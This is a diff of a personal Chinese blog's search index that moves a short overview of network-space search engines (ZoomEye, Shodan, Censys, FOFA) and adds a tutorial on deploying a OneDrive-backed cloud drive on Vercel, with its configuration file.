+  <script id="hbeData" type="hbeData" data-hmacdigest="666d2179323feb5ec551598dfa620f9d33b63bb1b19f3500446823dea8a9a014">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28bcd797fdd03af9079fd90a6aafb5667f8bccf824571670406f21c45ccb5cc1e47fdbd44b5d7948120df03b74e2d9c9453e3741d3ee454890670de4fdf917e8d72f32f924e799aebb3825fd0c8cc2c150740b19eb4ec53bc65fe929776e7f02622eb1c82d67baa3ed71d5bd4f4c3e067a8aedec73189c14bd616a510346983b14d83142b5759903890555356bdf4e71dd9f143a331c91587c1ef7abebca3fdcc7fb240f7ab6834375362c16e3e10163062d498f81e12b0faa815242b25ecb4df22429266042453aadae9c2a857a55ddf8a62731f6e2932bd22698916064fd08d06a841534b0866d7728247977b22bf205b5b94ad809f7249228f17d880f727967c8a0bd7062727e68f77227ffdafa2558714cb22db74c3850bd99f97c3119a065a03e56b43d56ddc82ba8d02949bd16c71599b673a3cf0e3a7e0c39c7be0184b9f895f5a4daab98ecacc17b6345c7ed805d8137abcb04c29026e95853ef609bef9b1a5169c35b027ce46de901efc555b834c439e78dd9276412cc5b02eadef701fd5db3a62c714bb502eed6645121a64a7d45b3d4164874b5d44defc352c5dc935400fb1966ce54395a4fc24138a2614514d4a94c5443ea358934abc666c829721d9ea38e891a1da25542d5deaeafe55866416a6763fa28ff600fba9a115cc8373ea8daec78cd431dbe847496276e4f4af064e96ab590fc7ba69f044e2573077d9b680ceca7a8004a5e47230f6d04cd7c07280cefbd1b4a48e7ea911909bcc59789c33cf5f9d7abf3a3bc154e354146bc80a419dfcbfccee7ed342f3b2856b465575cf8c266b85d40ef9fed7a2505abc6659643313b363824c2310e8fed8f633b5ba21342576d2be25dddf61ac2c66d52a81eb83f913a17e007d91f38f2d3c9e46c95aa795ee4bbb0f9e8c83db338c05d5c332be29fe250d6c807ab1f4be56df0bb046b92ffb469230ff66696f803085fd9c355a5243984577577220a27e84f41a5e4a81000e65e289513f914cdff9d5e2cb8ee57e71c62cffc36df1b8c0f01e1433ebf9431bea3727ad9cabc537b4ea5cbfd6faee2161f6e6f79cbc06da83fb80971d09703e617af93b01bc8333ef109eff4d198c34a22a45184c988b60ccbcb5a47e9144d1d1c2cf862f7602754eafb1218cfa6980e3de4905dbb03c5e63b7249aaebe28aefde6e51a37897eda29f1c0bef37da797ed2afa710e5d2714cc8258604908588c95b6bf8e3cc1585180fb57e58bd1808d9a5f05abc5f28af1af791018c407d8db26c32f07e60d45532d09343da936078f4e04d2515fbc63b5f1d53bff4cd6f27e81435d0a821b69e7b8914816af1c397edecaf9e3930e56e1f1e632ce517572c73ce64b70f26b63f921e0b6d69788acb054339a743df82e76fafb585f4f7966bb33a2501df5b02831c00d6f49381de41f6bc78632a055b37bb86e2f9bda1319cfc76f8cf95978a2af6cc33176588562f4d2139b16d0ed18226af8f692435ded43069cebd2b0e6654350c06f79bd4ad5520da3ce1a150e7fa0bd950cc63ada79b5a2f4f5db9c270680adf27499e1ad8cee50613b1a06e8d1b86472e11c3ad526ccc6a485722b27e1f1fa022c18e91a4b6ce0ac76da77b496dd9b016dc58a8a29f0045b524ba79b1d010c682ef061121492638b323332a2170e839c241e3206fa33d3210dc55b34ae4926dd22f70419cb4720b6545874b7846c23b60ac5279f83d7cc57dd7a7ed10e8ccb24eb7b8587efd2e3d13ab7456a0813388ecfe80a1936f5b91e3c277e60c7934fc3fe61676cfaaeb25260df3aa2c28f7fd782772212720434ff5e6ece2e6161db0a24785fe469220578561b32863b0e0c9506facf9b4c0205083a9aa382df58acdfafa71de0a84a2d58f8efa637d54e874f23963d088b4b5f59d6a07546fe030a2bc7da9e1da4d6d4fcd4d2cc315cbfe408a78dc82d0b78ae3ca25188b447aa0e8a62d3903b7feaf1421f7191d3a98f6849f8608fe24bacf734c01e949707e99caee6748f537f1d13f57535f75d5cb7a2fe8b5abf7ad210842ecee55ea7d45ed8f8ca7633d8136f93194c9247993e636766cb8e0f003a7f7fc922820acb16d7fbc7e55b776ccd30dfe05fbe1d54a6bf6e283f8556eff4945327b2a8f0afb8d99f4f35327a6fbbfd630db9e9ed20ced7cb0bf2593622e4906b7f6af5a8646037c1beaece1818a561dc16141f784bc14186ff66fce5aba30ccdcef5982cb6ae18d8f00b54aa0b4dee315c95dffae347bd296bb5b5c23b7356b24880aee37bbc9bec86eefaa8734638fb146475d222a13bb3b14b9dfd05da8026bc0e462758685fdacec1e17768cefc168b759abf909aab856e8df0f8368671dcb96401e9c30c8a8456c554a8bce3cf301769b6e5c92923da34b0d8a04f14d2eb0f5bc4372afd50586a25b9f50c1cfabf43dc83a216cb7c47cf9445abb3b30bfa2c25a586381726449e29e206c2468b6ca68cf05d88b1b881e005385cbcd8c9f6d4e8bc0ac0378b898b22004d2576ee1b50f62e2c1f35491db5cf51b8a33db23eb44d4890491222e79a92395e9494a2018a9a9dec978d8ba7fd4be5b06a2bda49ab5c63cade4bd520a22f1482b06e0b1cd213f28a24a29f102ee527a65cba5e58c550fa94701f7d2f7a370bc28ea38318fa1c40c630139e455d7d8d4293945f6703c304468ec9db040c062012c88abef9ea414e6cbc03f528587e38fd599f728878dead5ba09eb046b1043c32ab65e110007e81310c7c70023e018a02551c82776218280f053183222681cbfa52b649fdf16bccb1b0ad52a2b2466c13e5d74c757b6279456e095d15700c454ca1d80d4e53610caee23bc6a0c2e1ea0500d9b657c52da52242cbeec41c54b6326dc0a27ff9fd90890e0052af497016d6dc7db63a7faf124eb412b3e2ec8dadc22ebcecd37fd5c28eb1dbc3e6e38ba3d1c6b00d7c5f12c92934f7caba5fdf68222eaf589506112a82c7a0702b71ef42209f15d358a72cc96e0b01c5f7e3d2b5c4a642ba0cdde80d5514245873df84467a6c36ee889b821d1981dbe802823e2e6ba059de91f3f1df3546aa5aa3756e678ec41670cac78bccb7cf09206a0d937c1d2e4ccc03bf63e9141dde155606eb7241527138dbb477d0ca3f9ec7a9d17cd09def2185a4d8ef1323031c70ab269387f106bf9cf653eceaa5f3d5296db70d0901e7aa2a3d68fc612eb365c75656c00941b55d3a4d45455fac6059002f898a21c7f4b460532dda2bf8eb03e8c16f720e29f1074116a78301f9bbd2a43d274e39f6898ba10758bcbffcee3f661ca3e3c227a6c9b99ddec81437cbdb4187b79ba47495358d45e32ac793ef0953e4dd7e7174eaea19d0eb4fdc4b3c6c9ffe9ce3c1661f91e4ede119a9715f00f9f12e568fab689ab8feb561cbdf0181da05dd11fd5cea4819e6d5b6738ec24cb1d717769e6608aea0a7bc523aef9928ce6a02c03ce766f322b79d477e028e7e8b2a77f7c701f4d839ac7a8d95408461a74cdb4047288ef33148a4355c2629821241bd91c95aa8baa7ced9e6a57a3899fd0d359a2b260b0d83777b8718d0035184c61ebafaa11143675da1cd67890351d5862011c35429c4bf7927548b2f36b1efccad7ad399aac8332164b2ad901a6e9663890449eecab58d147acb6a06d676da278b3a523a951b6b85b2b3f24306dd3b6def987c78e67ecda4f33212fec193d611267749cdde871fc84d059344ecde839338706eafcbf31f640f889c283153c55c1ad7c40055a9f4943edc4a98046d5e6655d329d2969f2d5b7edeb4bacf67c64e4706dbacb3da84d18e25f0552dc268ba34bd23e96f22a1371b58f49fac0bb5770832a82ebb95c9cc762a26714ef45a1805897ea72d44b24573ac89d8cc7e602610d1edc44b0cc1e5d811bca3fba5c6b74d34107fa51fe4c5bba03fda1d7c588425fac6f927c4185b98d76b203a793de4d9168ec2e63d218f968b0e65926ac89c35204eca2801fae023794fa407550ef38d46e81ecfae990ad3adb30d658879445f88b494a4f53ac269c9775ac16340f30e4c15efc46de0fa21c217b8b8168bbb0a1b0aa7f50f0f33a516cfac03f1cb790be05002a11db7f47412ca20cee8df52d9821251441ddaef62db46d217eb37f48d4e5db7c2e1f797003a60419cb4c555e80974a4419c95c368f64d8ae8f5156337900bbd258ada5fffec1914d6aa6aa05cf9ef3248177e24f1568c14d032a5023141e84ef716c6488791b3a90def98f561fde7b9a7908f3bcc3e53bf6b436d48c73d834f48149e2b9ac4cdd24da95354f41a6eed783034e739aef8b8286c49970620d636e6d90c72ac28357a4a780002ac5e96e4abce44577b9533e40095c93cf3cdd566717124ba5a8c84ac5c08f18b8916034dcfed0db6269a74df9282dadec46d0bbe2dde8708ff20db447f04befa705d2e48eb1462d0d82b3dd68f958c15d40a17b1b9cac98d2b3767638551dec3531729edf90b22973fbb15d133d162a2760de9ae1a401563295a85b87c7f24f5ce7ccc94dcfea1b512007ff90fb7e7d6a5ffe12dbd94aa4c8b40237471f53203b5c6112f23bd41de769e514285c29156248538866eacaaa30bb86469e0e3fd56da5d86e097f6704ee54297ce6046e80ccf0323cf450cdaade7e472f6a2ee24af6f974d9b11cb088f35a50f3bab88d4ab64b8f994a9f3d70ca56d49b0024a7c6be799c1a9dfc8e71627530f52ff4d09d5707a75fa3cb1eb4d2cd4ff2a4856c4e06ba798b3f84008e03867d486f314c234bfec92463cc842b822fada1f485d56efa01d514e8806272d455c36fcd87414628473dbaf582ee9d4cd376ef759f30c885679efa1bf54c299db82f7bd860bc2e83e7227f3363a6eabe4449d31249c5fef01e0bc10e703ef20298140b5dd39a2a30d954d5a20ebaa9114af580d8cfc6fba1909db719b5bfe13f83ad0c6d20d7ef94ed755dab8e4550ff7d3237ffb707af42f11256f59890ab5ad2bf6cfa57e4979fb3db0564b13f12fc26785d96e0b138afd14d0b58123287270e6787768adbdd9938adfcb00e4d6f8b49d26d377b449fea51de5d425de1f774901522f235f3e028cc7a73a7d4d09c36524fe47945503073c5bc0477b86a46160a902b0696f4582817e01e0e70e4f622e92d90ca4a4123f9cf48dcfb91d6d2fd7afa940d35f5326d618d1ddb99620dc0bb9823e029028de0ff7d5704ce2a7085419ebb02d3793499d092b207242a1ca674ac2f3974e1d579c7c7261c6972007df6839eba1aabb12055107877912d62a7f7627002b700e154569853862aa6bd43d4f5478be4718fb8612ce90b48692ee1c29ef569ab6b08f4d81905fb8a82415a348b904087cefcab8a880141c33a4320f4653789ac38c55c05628f56eabc5f04db8e64a70488707ddbf5f6c8e0ac9f7ed9ee0b818b6e762b1b1c9b302fb651cf1ef7a64d6bf73937efbe4736372a74175f9845f5922b9e4d04c2186a5ea03dff9cb85907b8c2cc19f55a1253d18536dc779578c84fbd568d55ba9658c2ae6d5f6c590aea67f2c247f3c6a470f4395454bd69bfd8ef83a537b08286ac631e15585cdfbc4eb19809edc5651f16b09dab9556c00ad99e3a26393bb542db8786ceddca2687ae321ed721854c1ebb23567f5824b25fcab6cc4e4e48cbb23e61d4e9e29be4cc6a93dd665103553e4dd304005045635c044e8803617a88a19f14be8f7d420fbe0feea1b7f43ecd721d7b9e7779f4fc434bed7b03cd9119bfe79e06a1698d0644a5e5ae44cf3e1023f352cef7d4e5f5330429c8241d32ee22130c9ee1e3715a3e5d58f3950c9f379cef0d0d69c9837688914334ef892346a0f58b132f628c4df86507af6bec6547e810bfdcb98c98e4f211f0ceb3a6f094b33d4d644b6623b39dc06d82a2effe78d2957a43f4cdec02c145f7c3b97ec870c6dc228e86b45db46e26c2590e59d64d14d27a85be8221a87da0b4f0273952a214db0333112fd7b5242954e89f1cfbb1aff46786e87e1bd7e3d185283bd103da9e473d559784fbafc3034ec46b872e5980fe4bc19344628d89859479a000a23775cb041aade2da0f25370c70bc449629a608f2a251d1d0751c7b3be73854ff</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-up">
+      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，请输入密码</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
         <category>随手记</category>
       </categories>
-      <tags>
-        <tag>Vercel</tag>
-        <tag>网盘</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ZoomEye-网络空间搜索引擎</title>
-    <url>/2022/10/09/zoomeye/</url>
-    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
-<p class="p center small">一个针对网络空间的搜索引擎</p>
-<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
-<h1>ZoomEye</h1>
-<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
-<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
-<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
-<h1>其他网络空间搜索引擎</h1>
-<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
-<h2 id="Shodan">Shodan</h2>
-<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
-<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
-<h2 id="Censys">Censys</h2>
-<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
-<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
-<h2 id="FOFA">FOFA</h2>
-<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
-<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
   </entry>
   <entry>
     <title>CTF隐写术(其他文件隐写)</title>
@@ -3808,6 +3743,71 @@ PNG图片文件结构：</p>
       </categories>
       <tags>
         <tag>隐写</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ZoomEye-网络空间搜索引擎</title>
+    <url>/2022/10/09/zoomeye/</url>
+    <content><![CDATA[<p class="p center logo large">ZoomEye (钟馗之眼)</p>
+<p class="p center small">一个针对网络空间的搜索引擎</p>
+<p><img src="https://img.anineg.space/zoomeye2.png" alt=""></p>
+<h1>ZoomEye</h1>
+<p>得益于科技的高速发展，现在接入互联网的设备五花八门。除了PC和服务器，还有路由器、物联网家电、平板电脑、手机等，甚至还有监控探头、工业控制中的SCADA系统等比较敏感的设备。这些设备被视作节点，共同组成了我们所处的的<strong>网络空间（Cyberspace）</strong>。</p>
+<p><a href="https://www.zoomeye.org/">ZoomEye(“钟馗之眼”)网络空间搜索引擎</a>正是一个检索网络空间节点的搜索引擎。通过后端的分布式爬虫引擎（无论谁家的搜索引擎都是这样）对全球节点的分析，对每个节点的所拥有的特征进行判别，从而获得设备类型、固件版本、分布地点、开放端口服务等信息。</p>
+<div class="tag link"><a class="link-card" title="ZoomEye 是什么？怎么用？" href="https://zhuanlan.zhihu.com/p/19710755"><div class="left"><img src="https://img.anineg.space/zhihulogo.png"></div><div class="right"><p class="text">ZoomEye 是什么？怎么用？</p><p class="url">https://zhuanlan.zhihu.com/p/19710755</p></div></a></div>
+<h1>其他网络空间搜索引擎</h1>
+<p>目前国内外的网络空间搜索引擎有 shodan、zoomeye、cnesys、fofa</p>
+<h2 id="Shodan">Shodan</h2>
+<p><a href="https://www.shodan.io/">Shodan</a>是目前最为知名的黑客搜索引擎，它是由计算机程序员约翰·马瑟利（John Matherly）于 2009 年推出的，他在 2003 年就提出了搜索与 Internet 链接的设备的想法。发展至今已经变成搜索资源最全，搜索性能最强，TOP1 级别的网络资产搜索引擎。</p>
+<p><img src="https://img.anineg.space/image-20221010164225527.png" alt="image-20221010164225527"></p>
+<h2 id="Censys">Censys</h2>
+<p><a href="https://search.censys.io/">Censys</a> 是由密歇根大学的计算机科学家创立，帮助信息安全从业人员发现、监控和分析从互联网访问的设备的平台，Censys 能够扫描整个互联网，每天扫描 IPv4 地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。</p>
+<p><img src="https://img.anineg.space/image-20221010164200074.png" alt="image-20221010164200074"></p>
+<h2 id="FOFA">FOFA</h2>
+<p><a href="https://fofa.info/">FOFA</a>是白帽汇推出的一款网络空间搜索引擎，它通过进行网络空间测绘，能够帮助研究人员或者企业迅速进行网络资产匹配，例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。</p>
+<p><img src="https://img.anineg.space/image-20221010164142922.png" alt="image-20221010164142922"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建几乎0成本的个人网盘</title>
+    <url>/2022/11/20/yunpan/</url>
+    <content><![CDATA[<h1>Onedrive-Vercel-Index</h1>
+<p>最近在网上发现了一个挺有意思的项目<a href="https://github.com/spencerwooo/onedrive-vercel-index/">onedrive-vercel-index</a>，它可以在Vercel上部署一个属于你自己的网盘。那么相比于百度网盘，你对他有着很高的控制权，<s>并不需要担心你的资源会被河蟹</s>。那么至于网速，Onedrive给的带宽不太稳定，有时可以跑到满速，有时只有3MB/s，但怎么说也比某度网盘良心多了。</p>
+<p>但这个网盘最大的缺点就在于空间上。现在注册Onedrive默认是5GB的空间，这显然不够用。但是也并非没有办法，我们在某宝上花个大概三块钱就可以把一个账号的空间永久提升至15GB。当然，如果你是购买了office365的话，那你就可以拿到1T的容量，就不需要担心什么容量的问题。网上还有一种教育版的，容量为1-5T，但是我不建议大家使用，因为这个账号的管理员可以看到你的文件，大家应该都知道数据的重要性，所以不要贪便宜使用这种。</p>
+<p>最后一个问题，Vercel给你提供默认的域名大概率由于某些原因无法访问，所以你还需要拥有一个自己的域名，并把它解析到Vercel上。购买一个域名其实并不贵，如果是新用户就会更便宜了。例如<code>.space</code> <code>.top</code> <code>.asia</code>这类，新用户只需要个位数就能拿下一年，甚至在搞活动的时候一块钱就能拿下一个<code>.cn</code>域名。一个域名可以解析到很多服务器，对于已经有域名的同学来说，这个成本直接忽略不计。</p>
+<p>因此，与我个人而言，搭建这个基本上是不需要成本的，只是需要花费那么一丢丢的时间。但是对于刚上手的同学们来说，需要那么一点点的开销，但<s>相对于某度会员或者是他们卖的那种“24小时高速下载券”来说</s>并不多。</p>
+<h1>搭建网盘</h1>
+<h2 id="准备工作">准备工作</h2>
+<ul>
+<li>一台能上网的电脑</li>
+<li>一个GitHub账号</li>
+<li>一个Vercel账号</li>
+<li>一个Onedrive账号</li>
+</ul>
+<p>打开 onedrive-vercel-index 的<a href="https://github.com/spencerwooo/onedrive-vercel-index/">项目地址</a>并 <a href="https://github.com/spencerwooo/onedrive-vercel-index/fork">Fork</a> 到自己的账号中。</p>
+<p>打开项目中的/config/site.config.js，这个就是你的网盘的配置文件了，按照提示进行修改。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * This file contains the configuration used for customising the website, such as the folder to share,</span><br><span class="line"> * the title, used Google fonts, site icons, contact info, etc.</span><br><span class="line"> */</span><br><span class="line">module.exports = {</span><br><span class="line">  // This is what we use to identify who you are when you are initialising the website for the first time.</span><br><span class="line">  // Make sure this is exactly the same as the email address you use to sign into your Microsoft account.</span><br><span class="line">  // You can also put this in your Vercel's environment variable 'NEXT_PUBLIC_USER_PRINCIPLE_NAME' if you worry about</span><br><span class="line">  // your email being exposed in public.</span><br><span class="line">  userPrincipalName: process.env.NEXT_PUBLIC_USER_PRINCIPLE_NAME || '此处填写你的Onedrive账号',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is the website icon to the left of the title inside the navigation bar. It should be placed under the</span><br><span class="line">  // /public directory of your GitHub project (not your OneDrive folder!), and referenced here by its relative path to /public.</span><br><span class="line">  icon: '/icons/aninegtubiao.png(你的网站图标路径)',</span><br><span class="line"></span><br><span class="line">  // Prefix for KV Storage</span><br><span class="line">  kvPrefix: process.env.KV_PREFIX || '',</span><br><span class="line"></span><br><span class="line">  // The name of your website. Present alongside your icon.</span><br><span class="line">  title: "此处填写你的网站名字",</span><br><span class="line"></span><br><span class="line">  // The folder that you are to share publicly with onedrive-vercel-index. Use '/' if you want to share your root folder.</span><br><span class="line">  baseDirectory: '/Public(你要在网页上展示的文件夹)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This represents the maximum number of items that one directory lists, pagination supported.</span><br><span class="line">  // Do note that this is limited up to 200 items by the upstream OneDrive API.</span><br><span class="line">  maxItems: 100,</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] We use Google Fonts natively for font customisations.</span><br><span class="line">  // You can check and generate the required links and names at https://fonts.google.com.</span><br><span class="line">  // googleFontSans - the sans serif font used in onedrive-vercel-index.</span><br><span class="line">  googleFontSans: 'Inter',</span><br><span class="line">  // googleFontMono - the monospace font used in onedrive-vercel-index.</span><br><span class="line">  googleFontMono: 'Fira Mono',</span><br><span class="line">  // googleFontLinks -  an array of links for referencing the google font assets.</span><br><span class="line">  googleFontLinks: ['https://fonts.googleapis.com/css2?family=Fira+Mono&amp;family=Inter:wght@400;500;700&amp;display=swap'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] The footer component of your website. You can write HTML here, but you need to escape double</span><br><span class="line">  // quotes - changing " to \". You can write anything here, and if you like badges, generate some with https://shields.io</span><br><span class="line">  footer:</span><br><span class="line">    'Copyright © 2022 &lt;a href="https://anineg.space/" target="_blank"&gt;ANINEG&lt;/a&gt;  &amp;nbsp&amp;nbsp|&amp;nbsp&amp;nbsp  网盘资源仅供学习交流，严禁用于商业用途，请于24小时内删除(这里是页脚的内容)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is where you specify the folders that are password protected. It is an array of paths pointing to all</span><br><span class="line">  // the directories in which you have .password set. Check the documentation for details.</span><br><span class="line">  protectedRoutes: ['/个人', '/(这里几个地方填你要加密的文件夹的路径，将密码存成.password文件放在文件夹下)'],</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] Use "" here if you want to remove this email address from the nav bar.</span><br><span class="line">  email: 'mailto:email@anineg.space(别人联系你的邮箱地址，不要删掉就行)',</span><br><span class="line"></span><br><span class="line">  // [OPTIONAL] This is an array of names and links for setting your social information and links.</span><br><span class="line">  // In the latest update, all brand icons inside font awesome is supported and the icon to render is based on the name</span><br><span class="line">  // you provide. See the documentation for details.</span><br><span class="line">  links: [</span><br><span class="line">    {</span><br><span class="line">      name: '主页',</span><br><span class="line">      link: 'https://anineg.space/',</span><br><span class="line">    },</span><br><span class="line">  ],//这里填导航栏上你想要显示的链接</span><br><span class="line"></span><br><span class="line">  // This is a day.js-style datetime format string to format datetimes in the app. Ref to</span><br><span class="line">  // https://day.js.org/docs/en/display/format for detailed specification. The default value is ISO 8601 full datetime</span><br><span class="line">  // without timezone and replacing T with space.</span><br><span class="line">  datetimeFormat: 'YYYY-MM-DD HH:mm:ss',</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>然后打开 <a href="https://vercel.com/">Vercel 官网</a>注册登录，然后点 <code>New Project</code>，然后 Import 你刚刚 Fork 的仓库。然后点击 Deploy，仓库就会自动开始部署，一两分钟以后就好了。接下来，打开 Marketplace 中的 <a href="https://vercel.com/integrations/upstash">Upstash</a>，点击 <code>Add Integration</code>，然后选中你的账户，再选中你部署的仓库。如果这时出现了一些选项，最好都填上勾上。等待 Upstash 创建 Redis 数据库。完成创建后，在项目的 <code>Deployments</code> 中将项目 <code>Redeploy</code>。重新部署完成后，在<code>Settings</code>-<code>Domains</code>中填写你的域名并将其解析至Vercel后，即可访问部署好的网站。</p>
+<p>打开网站，根据网站的引导进行操作即可。到这里，你就拥有了一个自己的网盘了！</p>
+<p>当然，拿它来当图床，我想也是很不错的。</p>
+<h1>ANINEGの网盘</h1>
+<p>最后，放上我的网盘来给大家参考一下：</p>
+<p><img src="https://img.anineg.space/image-20221120120327292.png" alt="image-20221120120327292"></p>
+<p>网盘链接：</p>
+<div class="tag link"><a class="link-card" title="ANINEGの网盘" href="https://pan.anineg.space/zh-CN/"><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">ANINEGの网盘</p><p class="url">https://pan.anineg.space/zh-CN/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>随手记</category>
+      </categories>
+      <tags>
+        <tag>Vercel</tag>
+        <tag>网盘</tag>
       </tags>
   </entry>
 </search>
